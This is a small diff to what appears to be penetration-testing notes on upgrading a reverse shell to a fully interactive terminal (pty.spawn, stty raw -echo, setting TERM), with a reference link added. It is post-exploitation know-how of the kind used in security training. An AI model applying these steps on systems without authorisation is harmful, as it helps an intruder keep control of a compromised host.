@@ -21,16 +21,23 @@ wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x8
 
 ```
 # In reverse shell
+
 $ python -c 'import pty; pty.spawn("/bin/bash")'
 Ctrl-Z
 
 # In Kali
+
+$ echo $TERM
+$ stty -a
 $ stty raw -echo
 $ fg
 
 # In reverse shell
+
 $ reset
 $ export SHELL=bash
 $ export TERM=xterm-256color
 $ stty rows <num> columns <cols>
 ```
+
+REF: https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
